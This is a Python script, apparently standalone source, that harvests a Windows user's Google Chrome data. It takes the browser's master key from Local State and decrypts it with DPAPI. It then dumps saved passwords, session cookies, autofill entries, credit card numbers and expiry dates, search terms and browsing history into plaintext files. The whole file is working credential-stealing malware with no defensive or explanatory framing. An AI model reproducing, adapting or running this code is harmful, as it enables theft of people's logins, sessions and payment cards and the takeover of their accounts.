import os
import json
import shutil
import base64
import sqlite3
from zipfile import ZipFile
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta

class Chrome:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
        self._master_key = self._get_master_key()

    def _get_master_key(self):
        with open(self._user_data + "\\Local State", "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        code_stamp = epoch + timedelta(microseconds=time)
        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')

    def passwords(self):
        try:
            login_db = self._user_data + "\\Default\\Login Data"
            login_db_copy = os.getenv("TEMP") + "\\Login.db"
            shutil.copy2(login_db, login_db_copy)
            conn = sqlite3.connect(login_db_copy)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                with open("chrome_passwords.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        url = item[0]
                        username = item[1]
                        encrypted_password = item[2]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        f.write(f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(login_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

    def cookies(self):
        try:
            cookies_db = self._user_data + "\\Default\\Network\\cookies"
            cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
            shutil.copy2(cookies_db, cookies_db_copy)
            conn = sqlite3.connect(cookies_db_copy)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                with open("chrome_cookies.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        host = item[0]
                        user = item[1]
                        decrypted_cookie = self._decrypt(item[2], self._master_key)
                        f.write(f"HOST KEY: {host:<30} NAME: {user:<30} VALUE: {decrypted_cookie}\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(cookies_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

    def web_data(self):
        try:
            web_data_db = self._user_data + "\\Default\\Web Data"
            web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
            shutil.copy2(web_data_db, web_data_db_copy)
            conn = sqlite3.connect(web_data_db_copy)
            cursor = conn.cursor()

            try:
                cursor.execute("SELECT name, value FROM autofill")

                with open("chrome_autofill.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        name = item[0]
                        value = item[1]
                        f.write(f"{name}: {value}\n")

                cursor.execute("SELECT * FROM credit_cards")

                with open("chrome_credit_cards.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        username = item[1]
                        encrypted_password = item[4]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        expire_mon = item[2]
                        expire_year = item[3]
                        f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(web_data_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

    def history(self):
        try:
            history_db = self._user_data + "\\Default\\History"
            history_db_copy = os.getenv("TEMP") + "\\History.db"
            shutil.copy2(history_db, history_db_copy)
            conn = sqlite3.connect(history_db_copy)
            cursor = conn.cursor()

            try:
                cursor.execute('SELECT term FROM keyword_search_terms')

                with open("chrome_search_history.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        term = item[0]
                        f.write(f"{term}\n")

                cursor.execute('SELECT title, url, last_visit_time FROM urls')

                with open("chrome_web_history.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        title = item[0]
                        url = item[1]
                        last_time = self._convert_time(item[2])
                        f.write(f"Title: {title}\nUrl: {url}\nLast Time Visit: {last_time}\n\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(history_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

            
if __name__ == "__main__":
    chrome = Chrome()
    chrome.passwords()
    chrome.cookies()
    chrome.history()
    chrome.web_data()